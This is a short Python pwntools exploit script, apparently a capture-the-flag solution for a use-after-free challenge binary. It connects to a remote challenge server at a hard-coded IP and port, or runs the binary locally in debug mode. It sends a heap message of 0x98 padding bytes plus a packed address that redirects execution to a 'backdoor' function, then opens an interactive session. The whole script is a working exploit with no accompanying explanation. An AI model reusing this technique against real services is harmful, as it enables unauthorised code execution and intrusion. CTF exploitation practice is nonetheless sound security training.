#!/usr/bin/env python3
from pwn import *
import pwnlib.shellcraft

debug = 0

context.os='linux'

# need Ubuntu ???
# using tmux to run
context.terminal = ['tmux', 'splitw', '-h']

if debug == 1:
    gdbcmd = '''
    '''
    c = process('./uaf')
    # gdb.attach(c, gdbcmd)
    context.log_level ='debug'
else:
    c = remote('140.110.112.77', 4006)
    context.log_level ='debug'

c.sendlineafter('>', str(4))

# malloc
backdoor = p64(0x401239)
c.sendlineafter('>', str(1))
c.sendlineafter('Messege size:', str(0xa0))
c.sendafter('Messege:', b'a' * 0x98 + backdoor)

# exit
c.sendlineafter('>', str(4))
c.interactive()
c.close()

